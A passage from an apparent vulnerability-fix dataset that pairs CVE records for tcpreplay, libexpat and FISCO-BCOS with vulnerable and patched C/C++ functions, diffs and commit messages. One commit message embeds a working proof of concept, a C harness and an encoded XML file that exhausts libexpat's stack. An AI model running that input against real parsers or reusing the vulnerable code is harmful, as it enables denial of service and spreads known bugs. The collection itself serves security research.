    if (VAR_3 < 0) {
        err_no_exitx(""Unable to parse args: %s"", tcpedit_geterr(VAR_9));
        tcpedit_close(&VAR_9);
        exit(-1);
    } else if (VAR_3 == 1) {
        warnx(""%s"", tcpedit_geterr(VAR_9));
    }

    if (tcpedit_validate(VAR_9) < 0) {
        err_no_exitx(""Unable to edit packets given options:\n%s"",
                tcpedit_geterr(VAR_9));
        tcpedit_close(&VAR_9);
        exit(-1);
    }

    /* COMMENT_4 */
    fuzzing_init(VAR_9->fuzz_seed, VAR_9->fuzz_factor);

   /* COMMENT_5 */
    VAR_10.outfile = safe_strdup(OPT_ARG(VAR_11));
    dbgx(1, ""Rewriting DLT to %s"",
            pcap_datalink_val_to_name(tcpedit_get_output_dlt(VAR_9)));
    if ((VAR_4 = pcap_open_dead(tcpedit_get_output_dlt(VAR_9), 65535)) == NULL) {
        tcpedit_close(&VAR_9);
        err(-1, ""Unable to open dead pcap handle."");
    }

    dbgx(1, ""DLT of dlt_pcap is %s"",
        pcap_datalink_val_to_name(pcap_datalink(VAR_4)));

#ifdef VAR_5
    if (VAR_10.fragroute_args) {
        if ((VAR_10.frag_ctx = fragroute_init(65535, pcap_datalink(VAR_4), VAR_10.fragroute_args, VAR_6)) == NULL) {
            err_no_exitx(""%s"", VAR_6);
            tcpedit_close(&VAR_9);
            exit(-1);
        }
    }
#endif

#ifdef VAR_12
    if (VAR_10.verbose) {
        tcpdump_open(&VAR_13, VAR_4);
    }
#endif

    if ((VAR_10.pout = pcap_dump_open(VAR_4, VAR_10.outfile)) == NULL) {
        err_no_exitx(""Unable to open output pcap file: %s"", pcap_geterr(VAR_4));
        tcpedit_close(&VAR_9);
        exit(-1);
    }

    pcap_close(VAR_4);

    /* COMMENT_6 */
    if (rewrite_packets(VAR_9, VAR_10.pin, VAR_10.pout) == VAR_14) {
        err_no_exitx(""Error rewriting packets: %s"", tcpedit_geterr(VAR_9));
        tcpedit_close(&VAR_9);
        exit(-1);
    }

    /* COMMENT_7 */
    pcap_dump_close(VAR_10.pout);
    pcap_close(VAR_10.pin);
    tcpedit_close(&VAR_9);

#ifdef VAR_12
    tcpdump_close(&VAR_13);
#endif

#ifdef VAR_5
    if (VAR_10.frag_ctx) {
        fragroute_close(VAR_10.frag_ctx);
    }
#endif

#ifdef VAR_15
    dmalloc_shutdown();
#endif

    restore_stdin();
    return 0;
}",appneta/tcpreplay/7248ddb7ddd363b15b86e65022773f791764c33a/tcprewrite.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -18,22 +18,26 @@
 
     /* init tcpedit context */
     if (tcpedit_init(&tcpedit, pcap_datalink(options.pin)) < 0) {
-        errx(-1, ""Error initializing tcpedit: %s"", tcpedit_geterr(tcpedit));
+        err_no_exitx(""Error initializing tcpedit: %s"", tcpedit_geterr(tcpedit));
+        tcpedit_close(&tcpedit);
+        exit(-1);
     }
 
     /* parse the tcpedit args */
     rcode = tcpedit_post_args(tcpedit);
     if (rcode < 0) {
+        err_no_exitx(""Unable to parse args: %s"", tcpedit_geterr(tcpedit));
         tcpedit_close(&tcpedit);
-        errx(-1, ""Unable to parse args: %s"", tcpedit_geterr(tcpedit));
+        exit(-1);
     } else if (rcode == 1) {
         warnx(""%s"", tcpedit_geterr(tcpedit));
     }
 
     if (tcpedit_validate(tcpedit) < 0) {
+        err_no_exitx(""Unable to edit packets given options:\n%s"",
+                tcpedit_geterr(tcpedit));
         tcpedit_close(&tcpedit);
-        errx(-1, ""Unable to edit packets given options:\n%s"",
-                tcpedit_geterr(tcpedit));
+        exit(-1);
     }
 
     /* fuzzing init */
@@ -54,8 +58,9 @@
 #ifdef ENABLE_FRAGROUTE
     if (options.fragroute_args) {
         if ((options.frag_ctx = fragroute_init(65535, pcap_datalink(dlt_pcap), options.fragroute_args, ebuf)) == NULL) {
+            err_no_exitx(""%s"", ebuf);
             tcpedit_close(&tcpedit);
-            errx(-1, ""%s"", ebuf);
+            exit(-1);
         }
     }
 #endif
@@ -67,16 +72,18 @@
 #endif
 
     if ((options.pout = pcap_dump_open(dlt_pcap, options.outfile)) == NULL) {
+        err_no_exitx(""Unable to open output pcap file: %s"", pcap_geterr(dlt_pcap));
         tcpedit_close(&tcpedit);
-        errx(-1, ""Unable to open output pcap file: %s"", pcap_geterr(dlt_pcap));
+        exit(-1);
     }
 
     pcap_close(dlt_pcap);
 
     /* rewrite packets */
     if (rewrite_packets(tcpedit, options.pin, options.pout) == TCPEDIT_ERROR) {
+        err_no_exitx(""Error rewriting packets: %s"", tcpedit_geterr(tcpedit));
         tcpedit_close(&tcpedit);
-        errx(-1, ""Error rewriting packets: %s"", tcpedit_geterr(tcpedit));
+        exit(-1);
     }
 
     /* clean up after ourselves */","{'deleted_lines': ['        errx(-1, ""Error initializing tcpedit: %s"", tcpedit_geterr(tcpedit));', '        errx(-1, ""Unable to parse args: %s"", tcpedit_geterr(tcpedit));', '        errx(-1, ""Unable to edit packets given options:\\n%s"",', '                tcpedit_geterr(tcpedit));', '            errx(-1, ""%s"", ebuf);', '        errx(-1, ""Unable to open output pcap file: %s"", pcap_geterr(dlt_pcap));', '        errx(-1, ""Error rewriting packets: %s"", tcpedit_geterr(tcpedit));'], 'added_lines': ['        err_no_exitx(""Error initializing tcpedit: %s"", tcpedit_geterr(tcpedit));', '        tcpedit_close(&tcpedit);', '        exit(-1);', '        err_no_exitx(""Unable to parse args: %s"", tcpedit_geterr(tcpedit));', '        exit(-1);', '        err_no_exitx(""Unable to edit packets given options:\\n%s"",', '                tcpedit_geterr(tcpedit));', '        exit(-1);', '            err_no_exitx(""%s"", ebuf);', '            exit(-1);', '        err_no_exitx(""Unable to open output pcap file: %s"", pcap_geterr(dlt_pcap));', '        exit(-1);', '        err_no_exitx(""Error rewriting packets: %s"", tcpedit_geterr(tcpedit));', '        exit(-1);']}",True,Tcpreplay v4.4.1 has a heap-based buffer overflow in do_checksum_math at /tcpedit/checksum.c.,7.8,HIGH,2,valid,2022-02-12T00:10:54Z,4
CVE-2022-25313,['CWE-674'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,libexpat,"Prevent stack exhaustion in build_model

It is possible to trigger stack exhaustion in build_model function if
depth of nested children in DTD element is large enough. This happens
because build_node is a recursively called function within build_model.

The code has been adjusted to run iteratively. It uses the already
allocated heap space as temporary stack (growing from top to bottom).

Output is identical to recursive version. No new fields in data
structures were added, i.e. it keeps full API and ABI compatibility.
Instead the numchildren variable is used to temporarily keep the
index of items (uint vs int).

Documentation and readability improvements kindly added by Sebastian.

Proof of Concept:

1. Compile poc binary which parses XML file line by line

```
cat > poc.c << EOF
 #include <err.h>
 #include <expat.h>
 #include <stdio.h>

 XML_Parser parser;

 static void XMLCALL
 dummy_element_decl_handler(void *userData, const XML_Char *name,
                            XML_Content *model) {
   XML_FreeContentModel(parser, model);
 }

 int main(int argc, char *argv[]) {
   FILE *fp;
   char *p = NULL;
   size_t s = 0;
   ssize_t l;
   if (argc != 2)
     errx(1, ""usage: poc poc.xml"");
   if ((parser = XML_ParserCreate(NULL)) == NULL)
     errx(1, ""XML_ParserCreate"");
   XML_SetElementDeclHandler(parser, dummy_element_decl_handler);
   if ((fp = fopen(argv[1], ""r"")) == NULL)
     err(1, ""fopen"");
   while ((l = getline(&p, &s, fp)) > 0)
     if (XML_Parse(parser, p, (int)l, XML_FALSE) != XML_STATUS_OK)
       errx(1, ""XML_Parse"");
   XML_ParserFree(parser);
   free(p);
   fclose(fp);
   return 0;
 }
EOF
cc -std=c11 -D_POSIX_C_SOURCE=200809L -lexpat -o poc poc.c
```

2. Create XML file with a lot of nested groups in DTD element

```
cat > poc.xml.zst.b64 << EOF
KLUv/aQkACAAPAEA+DwhRE9DVFlQRSB1d3UgWwo8IUVMRU1FTlQgdXd1CigBAHv/58AJAgAQKAIA
ECgCABAoAgAQKAIAECgCABAoAgAQKHwAAChvd28KKQIA2/8gV24XBAIAECkCABApAgAQKQIAECkC
ABApAgAQKQIAEClVAAAgPl0+CgEA4A4I2VwwnQ==
EOF
base64 -d poc.xml.zst.b64 | zstd -d > poc.xml
```

3. Run Proof of Concept

```
./poc poc.xml
```

Co-authored-by: Sebastian Pipping <sebastian@pipping.org>",9b4ce651b26557f16103c3a366c91934ecd439ab,https://github.com/libexpat/libexpat/commit/9b4ce651b26557f16103c3a366c91934ecd439ab,expat/lib/xmlparse.c,build_model,"static XML_Content *
build_model(XML_Parser parser) {
DTD *const dtd = parser->m_dtd; 
XML_Content *ret;
XML_Content *cpos;
XML_Char *str;
#if UINT_MAX >= SIZE_MAX
if (dtd->scaffCount > (size_t)(-1) / sizeof(XML_Content)) {
return NULL;
}
if (dtd->contentStringLen > (size_t)(-1) / sizeof(XML_Char)) {
return NULL;
}
#endif
if (dtd->scaffCount * sizeof(XML_Content)
> (size_t)(-1) - dtd->contentStringLen * sizeof(XML_Char)) {
return NULL;
}
const size_t allocsize = (dtd->scaffCount * sizeof(XML_Content)
+ (dtd->contentStringLen * sizeof(XML_Char)));
ret = (XML_Content *)MALLOC(parser, allocsize);
if (! ret)
return NULL;
str = (XML_Char *)(&ret[dtd->scaffCount]);
cpos = &ret[1];
build_node(parser, 0, ret, &cpos, &str);
return ret;
}","static XML_Content *
build_model(XML_Parser VAR_0) {
DTD *const VAR_1 = VAR_0->m_dtd; 
XML_Content *VAR_2;
XML_Content *VAR_3;
XML_Char *VAR_4;
#if VAR_5 >= VAR_6
if (VAR_1->scaffCount > (size_t)(-1) / sizeof(XML_Content)) {
return NULL;
}
if (VAR_1->contentStringLen > (size_t)(-1) / sizeof(XML_Char)) {
return NULL;
}
#endif
if (VAR_1->scaffCount * sizeof(XML_Content)
> (size_t)(-1) - VAR_1->contentStringLen * sizeof(XML_Char)) {
return NULL;
}
const size_t VAR_7 = (VAR_1->scaffCount * sizeof(XML_Content)
+ (VAR_1->contentStringLen * sizeof(XML_Char)));
VAR_2 = (XML_Content *)MALLOC(VAR_0, VAR_7);
if (! VAR_2)
return NULL;
VAR_4 = (XML_Char *)(&VAR_2[VAR_1->scaffCount]);
VAR_3 = &VAR_2[1];
build_node(VAR_0, 0, VAR_2, &VAR_3, &VAR_4);
return VAR_2;
}",libexpat/9b4ce651b26557f16103c3a366c91934ecd439ab/xmlparse.c/vul/before/0.json,"static XML_Content *
build_model(XML_Parser parser) {
  /* Function build_model transforms the existing parser->m_dtd->scaffold
   * array of CONTENT_SCAFFOLD tree nodes into a new array of
   * XML_Content tree nodes followed by a gapless list of zero-terminated
   * strings. */
  DTD *const dtd = parser->m_dtd; /* save one level of indirection */
  XML_Content *ret;
  XML_Char *str; /* the current string writing location */

  /* Detect and prevent integer overflow.
   * The preprocessor guard addresses the ""always false"" warning
   * from -Wtype-limits on platforms where
   * sizeof(unsigned int) < sizeof(size_t), e.g. on x86_64. */
#if UINT_MAX >= SIZE_MAX
  if (dtd->scaffCount > (size_t)(-1) / sizeof(XML_Content)) {
    return NULL;
  }
  if (dtd->contentStringLen > (size_t)(-1) / sizeof(XML_Char)) {
    return NULL;
  }
#endif
  if (dtd->scaffCount * sizeof(XML_Content)
      > (size_t)(-1) - dtd->contentStringLen * sizeof(XML_Char)) {
    return NULL;
  }

  const size_t allocsize = (dtd->scaffCount * sizeof(XML_Content)
                            + (dtd->contentStringLen * sizeof(XML_Char)));

  ret = (XML_Content *)MALLOC(parser, allocsize);
  if (! ret)
    return NULL;

  /* What follows is an iterative implementation (of what was previously done
   * recursively in a dedicated function called ""build_node"".  The old recursive
   * build_node could be forced into stack exhaustion from input as small as a
   * few megabyte, and so that was a security issue.  Hence, a function call
   * stack is avoided now by resolving recursion.)
   *
   * The iterative approach works as follows:
   *
   * - We use space in the target array for building a temporary stack structure
   *   while that space is still unused.
   *   The stack grows from the array's end downwards and the ""actual data""
   *   grows from the start upwards, sequentially.
   *   (Because stack grows downwards, pushing onto the stack is a decrement
   *   while popping off the stack is an increment.)
   *
   * - A stack element appears as a regular XML_Content node on the outside,
   *   but only uses a single field -- numchildren -- to store the source
   *   tree node array index.  These are the breadcrumbs leading the way back
   *   during pre-order (node first) depth-first traversal.
   *
   * - The reason we know the stack will never grow into (or overlap with)
   *   the area with data of value at the start of the array is because
   *   the overall number of elements to process matches the size of the array,
   *   and the sum of fully processed nodes and yet-to-be processed nodes
   *   on the stack, cannot be more than the total number of nodes.
   *   It is possible for the top of the stack and the about-to-write node
   *   to meet, but that is safe because we get the source index out
   *   before doing any writes on that node.
   */
  XML_Content *dest = ret; /* tree node writing location, moves upwards */
  XML_Content *const destLimit = &ret[dtd->scaffCount];
  XML_Content *const stackBottom = &ret[dtd->scaffCount];
  XML_Content *stackTop = stackBottom; /* i.e. stack is initially empty */
  str = (XML_Char *)&ret[dtd->scaffCount];

  /* Push source tree root node index onto the stack */
  (--stackTop)->numchildren = 0;

  for (; dest < destLimit; dest++) {
    /* Pop source tree node index off the stack */
    const int src_node = (int)(stackTop++)->numchildren;

    /* Convert item */
    dest->type = dtd->scaffold[src_node].type;
    dest->quant = dtd->scaffold[src_node].quant;
    if (dest->type == XML_CTYPE_NAME) {
      const XML_Char *src;
      dest->name = str;
      src = dtd->scaffold[src_node].name;
      for (;;) {
        *str++ = *src;
        if (! *src)
          break;
        src++;
      }
      dest->numchildren = 0;
      dest->children = NULL;
    } else {
      unsigned int i;
      int cn;
      dest->name = NULL;
      dest->numchildren = dtd->scaffold[src_node].childcnt;
      dest->children = &dest[1];

      /* Push children to the stack
       * in a way where the first child ends up at the top of the
       * (downwards growing) stack, in order to be processed first. */
      stackTop -= dest->numchildren;
      for (i = 0, cn = dtd->scaffold[src_node].firstchild;
           i < dest->numchildren; i++, cn = dtd->scaffold[cn].nextsib) {
        (stackTop + i)->numchildren = (unsigned int)cn;
      }
    }
  }

  return ret;
}","static XML_Content *
build_model(XML_Parser VAR_0) {
  /* COMMENT_0 */
                                                             
                                                                         
                
  DTD *const VAR_1 = VAR_0->m_dtd; /* COMMENT_4 */
  XML_Content *VAR_2;
  XML_Char *VAR_3; /* COMMENT_5 */

  /* COMMENT_6 */
                                                                
                                          
                                                              
#if VAR_4 >= VAR_5
  if (VAR_1->scaffCount > (size_t)(-1) / sizeof(XML_Content)) {
    return NULL;
  }
  if (VAR_1->contentStringLen > (size_t)(-1) / sizeof(XML_Char)) {
    return NULL;
  }
#endif
  if (VAR_1->scaffCount * sizeof(XML_Content)
      > (size_t)(-1) - VAR_1->contentStringLen * sizeof(XML_Char)) {
    return NULL;
  }

  const size_t VAR_6 = (VAR_1->scaffCount * sizeof(XML_Content)
                            + (VAR_1->contentStringLen * sizeof(XML_Char)));

  VAR_2 = (XML_Content *)MALLOC(VAR_0, VAR_6);
  if (! VAR_2)
    return NULL;

  /* COMMENT_10 */
                                                                                
                                                                              
                                                                            
                                                  
    
                                             
    
                                                                                
                                        
                                                                           
                                                  
                                                                            
                                                    
    
                                                                            
                                                                         
                                                                             
                                                           
    
                                                                          
                                                                       
                                                                               
                                                                         
                                                                   
                                                                          
                                                                    
                                            
     
  XML_Content *VAR_7 = VAR_2; /* COMMENT_36 */
  XML_Content *const VAR_8 = &VAR_2[VAR_1->scaffCount];
  XML_Content *const VAR_9 = &VAR_2[VAR_1->scaffCount];
  XML_Content *VAR_10 = VAR_9; /* COMMENT_37 */
  VAR_3 = (XML_Char *)&VAR_2[VAR_1->scaffCount];

  /* COMMENT_38 */
  (--VAR_10)->numchildren = 0;

  for (; VAR_7 < VAR_8; VAR_7++) {
    /* COMMENT_39 */
    const int VAR_11 = (int)(VAR_10++)->numchildren;

    /* COMMENT_40 */
    VAR_7->type = VAR_1->scaffold[VAR_11].type;
    VAR_7->quant = VAR_1->scaffold[VAR_11].quant;
    if (VAR_7->type == VAR_12) {
      const XML_Char *VAR_13;
      VAR_7->name = VAR_3;
      VAR_13 = VAR_1->scaffold[VAR_11].name;
      for (;;) {
        *VAR_3++ = *VAR_13;
        if (! *VAR_13)
          break;
        VAR_13++;
      }
      VAR_7->numchildren = 0;
      VAR_7->children = NULL;
    } else {
      unsigned int VAR_14;
      int VAR_15;
      VAR_7->name = NULL;
      VAR_7->numchildren = VAR_1->scaffold[VAR_11].childcnt;
      VAR_7->children = &VAR_7[1];

      /* COMMENT_41 */
                                                                 
                                                                      
      VAR_10 -= VAR_7->numchildren;
      for (VAR_14 = 0, VAR_15 = VAR_1->scaffold[VAR_11].firstchild;
           VAR_14 < VAR_7->numchildren; VAR_14++, VAR_15 = VAR_1->scaffold[VAR_15].nextsib) {
        (VAR_10 + VAR_14)->numchildren = (unsigned int)VAR_15;
      }
    }
  }

  return VAR_2;
}",libexpat/9b4ce651b26557f16103c3a366c91934ecd439ab/xmlparse.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,9 +1,12 @@
 static XML_Content *
 build_model(XML_Parser parser) {
+  /* Function build_model transforms the existing parser->m_dtd->scaffold
+   * array of CONTENT_SCAFFOLD tree nodes into a new array of
+   * XML_Content tree nodes followed by a gapless list of zero-terminated
+   * strings. */
   DTD *const dtd = parser->m_dtd; /* save one level of indirection */
   XML_Content *ret;
-  XML_Content *cpos;
-  XML_Char *str;
+  XML_Char *str; /* the current string writing location */
 
   /* Detect and prevent integer overflow.
    * The preprocessor guard addresses the ""always false"" warning
@@ -29,9 +32,80 @@
   if (! ret)
     return NULL;
 
-  str = (XML_Char *)(&ret[dtd->scaffCount]);
-  cpos = &ret[1];
+  /* What follows is an iterative implementation (of what was previously done
+   * recursively in a dedicated function called ""build_node"".  The old recursive
+   * build_node could be forced into stack exhaustion from input as small as a
+   * few megabyte, and so that was a security issue.  Hence, a function call
+   * stack is avoided now by resolving recursion.)
+   *
+   * The iterative approach works as follows:
+   *
+   * - We use space in the target array for building a temporary stack structure
+   *   while that space is still unused.
+   *   The stack grows from the array's end downwards and the ""actual data""
+   *   grows from the start upwards, sequentially.
+   *   (Because stack grows downwards, pushing onto the stack is a decrement
+   *   while popping off the stack is an increment.)
+   *
+   * - A stack element appears as a regular XML_Content node on the outside,
+   *   but only uses a single field -- numchildren -- to store the source
+   *   tree node array index.  These are the breadcrumbs leading the way back
+   *   during pre-order (node first) depth-first traversal.
+   *
+   * - The reason we know the stack will never grow into (or overlap with)
+   *   the area with data of value at the start of the array is because
+   *   the overall number of elements to process matches the size of the array,
+   *   and the sum of fully processed nodes and yet-to-be processed nodes
+   *   on the stack, cannot be more than the total number of nodes.
+   *   It is possible for the top of the stack and the about-to-write node
+   *   to meet, but that is safe because we get the source index out
+   *   before doing any writes on that node.
+   */
+  XML_Content *dest = ret; /* tree node writing location, moves upwards */
+  XML_Content *const destLimit = &ret[dtd->scaffCount];
+  XML_Content *const stackBottom = &ret[dtd->scaffCount];
+  XML_Content *stackTop = stackBottom; /* i.e. stack is initially empty */
+  str = (XML_Char *)&ret[dtd->scaffCount];
 
-  build_node(parser, 0, ret, &cpos, &str);
+  /* Push source tree root node index onto the stack */
+  (--stackTop)->numchildren = 0;
+
+  for (; dest < destLimit; dest++) {
+    /* Pop source tree node index off the stack */
+    const int src_node = (int)(stackTop++)->numchildren;
+
+    /* Convert item */
+    dest->type = dtd->scaffold[src_node].type;
+    dest->quant = dtd->scaffold[src_node].quant;
+    if (dest->type == XML_CTYPE_NAME) {
+      const XML_Char *src;
+      dest->name = str;
+      src = dtd->scaffold[src_node].name;
+      for (;;) {
+        *str++ = *src;
+        if (! *src)
+          break;
+        src++;
+      }
+      dest->numchildren = 0;
+      dest->children = NULL;
+    } else {
+      unsigned int i;
+      int cn;
+      dest->name = NULL;
+      dest->numchildren = dtd->scaffold[src_node].childcnt;
+      dest->children = &dest[1];
+
+      /* Push children to the stack
+       * in a way where the first child ends up at the top of the
+       * (downwards growing) stack, in order to be processed first. */
+      stackTop -= dest->numchildren;
+      for (i = 0, cn = dtd->scaffold[src_node].firstchild;
+           i < dest->numchildren; i++, cn = dtd->scaffold[cn].nextsib) {
+        (stackTop + i)->numchildren = (unsigned int)cn;
+      }
+    }
+  }
+
   return ret;
 }","{'deleted_lines': ['  XML_Content *cpos;', '  XML_Char *str;', '  str = (XML_Char *)(&ret[dtd->scaffCount]);', '  cpos = &ret[1];', '  build_node(parser, 0, ret, &cpos, &str);'], 'added_lines': ['  /* Function build_model transforms the existing parser->m_dtd->scaffold', '   * array of CONTENT_SCAFFOLD tree nodes into a new array of', '   * XML_Content tree nodes followed by a gapless list of zero-terminated', '   * strings. */', '  XML_Char *str; /* the current string writing location */', '  /* What follows is an iterative implementation (of what was previously done', '   * recursively in a dedicated function called ""build_node"".  The old recursive', '   * build_node could be forced into stack exhaustion from input as small as a', '   * few megabyte, and so that was a security issue.  Hence, a function call', '   * stack is avoided now by resolving recursion.)', '   *', '   * The iterative approach works as follows:', '   *', '   * - We use space in the target array for building a temporary stack structure', '   *   while that space is still unused.', '   *   The stack grows from the array\'s end downwards and the ""actual data""', '   *   grows from the start upwards, sequentially.', '   *   (Because stack grows downwards, pushing onto the stack is a decrement', '   *   while popping off the stack is an increment.)', '   *', '   * - A stack element appears as a regular XML_Content node on the outside,', '   *   but only uses a single field -- numchildren -- to store the source', '   *   tree node array index.  These are the breadcrumbs leading the way back', '   *   during pre-order (node first) depth-first traversal.', '   *', '   * - The reason we know the stack will never grow into (or overlap with)', '   *   the area with data of value at the start of the array is because', '   *   the overall number of elements to process matches the size of the array,', '   *   and the sum of fully processed nodes and yet-to-be processed nodes', '   *   on the stack, cannot be more than the total number of nodes.', '   *   It is possible for the top of the stack and the about-to-write node', '   *   to meet, but that is safe because we get the source index out', '   *   before doing any writes on that node.', '   */', '  XML_Content *dest = ret; /* tree node writing location, moves upwards */', '  XML_Content *const destLimit = &ret[dtd->scaffCount];', '  XML_Content *const stackBottom = &ret[dtd->scaffCount];', '  XML_Content *stackTop = stackBottom; /* i.e. stack is initially empty */', '  str = (XML_Char *)&ret[dtd->scaffCount];', '  /* Push source tree root node index onto the stack */', '  (--stackTop)->numchildren = 0;', '', '  for (; dest < destLimit; dest++) {', '    /* Pop source tree node index off the stack */', '    const int src_node = (int)(stackTop++)->numchildren;', '', '    /* Convert item */', '    dest->type = dtd->scaffold[src_node].type;', '    dest->quant = dtd->scaffold[src_node].quant;', '    if (dest->type == XML_CTYPE_NAME) {', '      const XML_Char *src;', '      dest->name = str;', '      src = dtd->scaffold[src_node].name;', '      for (;;) {', '        *str++ = *src;', '        if (! *src)', '          break;', '        src++;', '      }', '      dest->numchildren = 0;', '      dest->children = NULL;', '    } else {', '      unsigned int i;', '      int cn;', '      dest->name = NULL;', '      dest->numchildren = dtd->scaffold[src_node].childcnt;', '      dest->children = &dest[1];', '', '      /* Push children to the stack', '       * in a way where the first child ends up at the top of the', '       * (downwards growing) stack, in order to be processed first. */', '      stackTop -= dest->numchildren;', '      for (i = 0, cn = dtd->scaffold[src_node].firstchild;', '           i < dest->numchildren; i++, cn = dtd->scaffold[cn].nextsib) {', '        (stackTop + i)->numchildren = (unsigned int)cn;', '      }', '    }', '  }', '']}",True,"In Expat (aka libexpat) before 2.4.5, an attacker can trigger stack exhaustion in build_model via a large nesting depth in the DTD element.",6.5,MEDIUM,1,valid,2022-02-15T11:54:29Z,4
CVE-2022-26534,['CWE-Other'],AV:N/AC:L/Au:N/C:N/I:N/A:P,0,FISCO-BCOS,fix tryToTriggerFastViewChange,d2fe66054753d65bbe7f88b0a1fc1fab4b716d0e,https://github.com/FISCO-BCOS/FISCO-BCOS/commit/d2fe66054753d65bbe7f88b0a1fc1fab4b716d0e,bcos-pbft/bcos-pbft/pbft/engine/PBFTEngine.cpp,PBFTEngine::handleViewChangeMsg,"bool PBFTEngine::handleViewChangeMsg(ViewChangeMsgInterface::Ptr _viewChangeMsg)
{
if (!isValidViewChangeMsg(_viewChangeMsg->from(), _viewChangeMsg))
{
return false;
}
m_cacheProcessor->addViewChangeReq(_viewChangeMsg);
auto leaderIndex =
m_config->leaderIndexInNewViewPeriod(_viewChangeMsg->index() + 1, _viewChangeMsg->index());
if (_viewChangeMsg->generatedFrom() == leaderIndex ||
(m_cacheProcessor->getViewChangeWeight(_viewChangeMsg->view()) >
m_config->maxFaultyQuorum()))
{
auto view = m_cacheProcessor->tryToTriggerFastViewChange();
if (view > 0)
{
triggerTimeout();
}
}
auto newViewMsg = m_cacheProcessor->checkAndTryIntoNewView();
if (newViewMsg)
{
reHandlePrePrepareProposals(newViewMsg);
return true;
}
return true;
}","bool PBFTEngine::handleViewChangeMsg(ViewChangeMsgInterface::Ptr VAR_0)
{
if (!isValidViewChangeMsg(VAR_0->from(), VAR_0))
{
return false;
}
VAR_1->addViewChangeReq(VAR_0);
auto VAR_2 =
VAR_3->leaderIndexInNewViewPeriod(VAR_0->index() + 1, VAR_0->index());
if (VAR_0->generatedFrom() == VAR_2 ||
(VAR_1->getViewChangeWeight(VAR_0->view()) >
VAR_3->maxFaultyQuorum()))
{
auto VAR_4 = VAR_1->tryToTriggerFastViewChange();
if (VAR_4 > 0)
{
triggerTimeout();
}
}
auto VAR_5 = VAR_1->checkAndTryIntoNewView();
if (VAR_5)
{
reHandlePrePrepareProposals(VAR_5);
return true;
}
return true;
}",FISCO-BCOS/d2fe66054753d65bbe7f88b0a1fc1fab4b716d0e/PBFTEngine.cpp/vul/before/0.json,"bool PBFTEngine::handleViewChangeMsg(ViewChangeMsgInterface::Ptr _viewChangeMsg)
{
    if (!isValidViewChangeMsg(_viewChangeMsg->from(), _viewChangeMsg))
    {
        return false;
    }
    m_cacheProcessor->addViewChangeReq(_viewChangeMsg);
    // try to trigger fast view change if receive more than (f+1) valid view
    // change messages whose view is greater than the current view: sends a
    // view-change message for the smallest view in the set, even if its timer has
    // not expired
    auto leaderIndex =
        m_config->leaderIndexInNewViewPeriod(_viewChangeMsg->index() + 1, _viewChangeMsg->index());
    if (_viewChangeMsg->generatedFrom() == leaderIndex ||
        (m_cacheProcessor->getViewChangeWeight(_viewChangeMsg->view()) >
            m_config->maxFaultyQuorum()))
    {
        auto view = m_cacheProcessor->tryToTriggerFastViewChange();
        if (view > 0)
        {
            // trigger timeout to reach fast view change
            triggerTimeout(false);
        }
    }
    auto newViewMsg = m_cacheProcessor->checkAndTryIntoNewView();
    if (newViewMsg)
    {
        reHandlePrePrepareProposals(newViewMsg);
        return true;
    }
    return true;
}","bool PBFTEngine::handleViewChangeMsg(ViewChangeMsgInterface::Ptr VAR_0)
{
    if (!isValidViewChangeMsg(VAR_0->from(), VAR_0))
    {
        return false;
    }
    VAR_1->addViewChangeReq(VAR_0);
    /* COMMENT_0 */
    /* COMMENT_1 */
    /* COMMENT_2 */
    /* COMMENT_3 */
    auto VAR_2 =
        VAR_3->leaderIndexInNewViewPeriod(VAR_0->index() + 1, VAR_0->index());
    if (VAR_0->generatedFrom() == VAR_2 ||
        (VAR_1->getViewChangeWeight(VAR_0->view()) >
            VAR_3->maxFaultyQuorum()))
    {
        auto VAR_4 = VAR_1->tryToTriggerFastViewChange();
        if (VAR_4 > 0)
        {
            /* COMMENT_4 */
            triggerTimeout(false);
        }
    }
    auto VAR_5 = VAR_1->checkAndTryIntoNewView();
    if (VAR_5)
    {
        reHandlePrePrepareProposals(VAR_5);
        return true;
    }
    return true;
}",FISCO-BCOS/d2fe66054753d65bbe7f88b0a1fc1fab4b716d0e/PBFTEngine.cpp/vul/after/0.json,"--- func_before
+++ func_after
@@ -19,7 +19,7 @@
         if (view > 0)
         {
             // trigger timeout to reach fast view change
-            triggerTimeout();
+            triggerTimeout(false);
         }
     }
     auto newViewMsg = m_cacheProcessor->checkAndTryIntoNewView();","{'deleted_lines': ['            triggerTimeout();'], 'added_lines': ['            triggerTimeout(false);']}",True,"FISCO-BCOS release-3.0.0-rc2 was discovered to contain an issue where a malicious node, via a malicious viewchange packet, will cause normal nodes to change view excessively and stop generating blocks.",7.5,HIGH,2,valid,2022-03-01T11:09:35Z,4
CVE-2022-26534,['CWE-Other'],AV:N/AC:L/Au:N/C:N/I:N/A:P,0,FISCO-BCOS,fix tryToTriggerFastViewChange,d2fe66054753d65bbe7f88b0a1fc1fab4b716d0e,https://github.com/FISCO-BCOS/FISCO-BCOS/commit/d2fe66054753d65bbe7f88b0a1fc1fab4b716d0e,bcos-pbft/bcos-pbft/pbft/cache/PBFTCacheProcessor.cpp,PBFTCacheProcessor::tryToTriggerFastViewChange,"ViewType PBFTCacheProcessor::tryToTriggerFastViewChange()
{
uint64_t greaterViewWeight = 0;
ViewType viewToReach = 0;
for (auto const& it : m_viewChangeCache)
{
auto view = it.first;
if (view <= m_config->toView())
{
continue;
}
if (viewToReach == 0)
{
viewToReach = view;
}
if (viewToReach > view)
{
viewToReach = view;
}
auto viewChangeCache = it.second;
for (auto const& cache : viewChangeCache)
{
auto fromIdx = cache.first;
auto nodeInfo = m_config->getConsensusNodeByIndex(fromIdx);
if (!nodeInfo)
{
continue;
}
greaterViewWeight += nodeInfo->weight();
}
}
if (greaterViewWeight < (m_config->maxFaultyQuorum() + 1))
{
return 0;
}
if (m_config->toView() >= viewToReach)
{
return 0;
}
if (viewToReach > 0)
{
m_config->setToView(viewToReach - 1);
}
PBFT_LOG(INFO) << LOG_DESC(""tryToTriggerFastViewChange"") << LOG_KV(""viewToReach"", viewToReach)
<< m_config->printCurrentState();
return viewToReach;
}","ViewType PBFTCacheProcessor::tryToTriggerFastViewChange()
{
uint64_t VAR_0 = 0;
ViewType VAR_1 = 0;
for (auto const& VAR_2 : VAR_3)
{
auto VAR_4 = VAR_2.first;
if (VAR_4 <= VAR_5->toView())
{
continue;
}
if (VAR_1 == 0)
{
VAR_1 = VAR_4;
}
if (VAR_1 > VAR_4)
{
VAR_1 = VAR_4;
}
auto VAR_6 = VAR_2.second;
for (auto const& VAR_7 : VAR_6)
{
auto VAR_8 = VAR_7.first;
